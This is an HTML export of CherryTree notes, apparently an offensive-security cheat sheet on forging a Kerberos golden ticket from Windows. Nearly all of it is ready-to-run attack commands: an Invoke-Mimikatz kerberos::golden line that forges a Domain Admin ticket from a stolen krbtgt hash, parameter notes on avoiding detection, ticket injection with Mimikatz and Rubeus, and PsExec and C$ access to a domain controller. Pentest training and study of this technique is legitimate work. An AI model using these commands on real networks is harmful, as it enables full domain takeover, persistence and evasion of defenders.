<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>from Windows</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># Craft Golden Ticket from Windows</h1></strong><br /><br /><div class="codebox"><div class="codebox">#&nbsp;CRAFT&nbsp;TICKET<br />#&nbsp;-------------------------------------------<br />Invoke-Mimikatz&nbsp;-Command&nbsp;&#39;&quot;kerberos::golden&nbsp;/user:Administrator&nbsp;/id:500&nbsp;/groups:512&nbsp;/domain:umbrella.local&nbsp;/sid:&lt;domain&nbsp;sid&gt;&nbsp;/krbtgt:&lt;krbtgt&nbsp;hash&gt;&nbsp;/startoffset:0&nbsp;/endin:600&nbsp;/renewmax:10080&nbsp;/ptt&quot;&#39;<br /><br />#&nbsp;kerberos::golden&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;name&nbsp;of&nbsp;module&nbsp;to&nbsp;use<br />#&nbsp;/user:Administrator&nbsp;-&nbsp;username&nbsp;for&nbsp;which&nbsp;the&nbsp;TGT&nbsp;is&nbsp;generated<br />#&nbsp;/domain:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;domain&nbsp;FQDN<br />#&nbsp;/sid:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;SID&nbsp;of&nbsp;the&nbsp;domain<br />#&nbsp;/krbtgt:6f6b5a...&nbsp;&nbsp;&nbsp;-&nbsp;NTLM&nbsp;(RC4)&nbsp;hash&nbsp;of&nbsp;service&nbsp;account.&nbsp;use&nbsp;/aes128&nbsp;or&nbsp;/aes256&nbsp;for&nbsp;AES&nbsp;keys<br />#&nbsp;/id:500&nbsp;/groups:512&nbsp;-&nbsp;OPTIONAL&nbsp;-&nbsp;set&nbsp;user&nbsp;ID&nbsp;and&nbsp;group&nbsp;ID<br />#&nbsp;/startoffset:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;OPTIONAL&nbsp;-&nbsp;define&nbsp;when&nbsp;ticket&nbsp;is&nbsp;available&nbsp;(default&nbsp;=&nbsp;0,&nbsp;right&nbsp;now)<br />#&nbsp;/endin:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;OPTIONAL&nbsp;-&nbsp;define&nbsp;ticket&nbsp;lifetime&nbsp;(default&nbsp;=&nbsp;10&nbsp;years,&nbsp;gets&nbsp;detected)<br />#&nbsp;/renewmax:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;OPTIONAL&nbsp;-&nbsp;define&nbsp;ticket&nbsp;renewal&nbsp;(default&nbsp;=&nbsp;10&nbsp;years,&nbsp;gets&nbsp;detected)<br /><br />#&nbsp;/ptt&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;inject&nbsp;ticket&nbsp;into&nbsp;current&nbsp;PowerShell&nbsp;process&nbsp;(no&nbsp;write&nbsp;to&nbsp;disk)<br />#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;use&nbsp;/ticket&nbsp;save&nbsp;ticket&nbsp;to&nbsp;disk&nbsp;for&nbsp;later&nbsp;use<br /><br /><br />#&nbsp;INJECT&nbsp;TICKET&nbsp;(if&nbsp;didn&#39;t&nbsp;use&nbsp;/ptt&nbsp;to&nbsp;inject&nbsp;into&nbsp;current&nbsp;powershell&nbsp;process)<br />#&nbsp;-------------------------------------------<br />#&nbsp;Mimikatz<br />kerberos::ptt&nbsp;&lt;ticket_kirbi_file&gt;<br />#&nbsp;Rubeus<br />.\Rubeus.exe&nbsp;ptt&nbsp;/ticket:&lt;ticket_kirbi_file&gt;<br />#&nbsp;Rubeus&nbsp;-&nbsp;inject&nbsp;from&nbsp;base64&nbsp;blob<br />.\Rubeus.exe&nbsp;ptt&nbsp;/ticket:BASE64BLOBHERE<br /><br />#&nbsp;list&nbsp;tickets<br />klist<br /><br />#&nbsp;USE<br />#&nbsp;&nbsp;&nbsp;-&nbsp;any&nbsp;PSRemoting,&nbsp;WMI,&nbsp;WinRM&nbsp;stuff&nbsp;should&nbsp;work&nbsp;(providing&nbsp;the&nbsp;ticket&nbsp;gives&nbsp;you&nbsp;access)<br />#&nbsp;-------------------------------------------<br />dir&nbsp;\\domain-controller.dollarcorp.moneycorp.local\C$<br />#&nbsp;Execute&nbsp;a&nbsp;cmd&nbsp;in&nbsp;the&nbsp;remote&nbsp;machine&nbsp;with&nbsp;PsExec<br />.\PsExec.exe&nbsp;-accepteula&nbsp;\\&lt;remote_hostname&gt;&nbsp;cmd<br /><br /></div></div></div>
</body>
</html>
